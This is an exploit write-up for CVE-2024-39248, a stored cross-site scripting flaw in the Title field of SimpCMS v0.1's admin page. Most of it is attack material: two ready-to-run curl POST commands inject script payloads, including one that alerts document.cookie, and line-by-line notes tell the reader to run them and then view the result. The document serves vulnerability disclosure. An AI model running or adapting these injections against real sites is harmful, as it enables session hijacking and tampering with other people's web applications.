## Exploit Title: SimpCMS v0.1 - Cross Site Scripting (XSS)
## CVE: CVE-2024-39248
## Exploit Author: Jason Jacobs (0xjason_jacobs - Twitter)

## Vendor Homepage: https://sourceforge.net/projects/simpcms/
## Vulnerable endpoint: /SimpCMS/admin.php

A cross-site scripting (XSS) vulnerability in SimpCMS v0.1 allows
attackers to execute arbitrary web scripts or HTML via a crafted
payload injected into the Title field at /admin.php.

### Updated cURL command parameters for the SimpCMS version live on SourceForge:

Upon logging in to the admin interface for SimpCMS, copy your respective Cookie values observed in the Application tab in the browser Inspect element and submit the following curl request:

> curl -X POST "http://site.com/SimpCMS/admin/index.php" -d "title=<script>alert(document.cookie)</script>&abbrev=random&newSector=" -b "PHPSESSID=c4v4tjh5fpv4po3k5dp5mrb8r0"

![command](command.png)

![poc](poc.png)


### Parameters from the initial CVE submission (Same exploit works):

The initial parameters observed for the SimpCMS software resulted in the following cURL command but was later updated:

> curl -X POST "http://site.com/SimpCMS/admin.php" -d "title=%3Cbody+onload%3Dalert%281%29%3E&text=ee&cat=something&main=1&submit=submit" -b "username=admin; password=PARAMVALUE"

Explanation:
> - curl: The command-line tool for transferring data with URLs.
> - -X POST: Specifies the request method to use (POST).
> - "http://site.com/SimpCMS/admin.php": The URL to which the request is sent.
> - -d "title=<script>alert(document.cookie)</script>&abbrev=random&newSector=" -b "PHPSESSID=c4v4tjh5fpv4po3k5dp5mrb8r0" - The POST request payload.

Run this command in your terminal to send the POST request with the XSS payload.
Visit the /SimpCMS main site and the XSS will be visible.

CWE: https://cwe.mitre.org/data/definitions/79.html
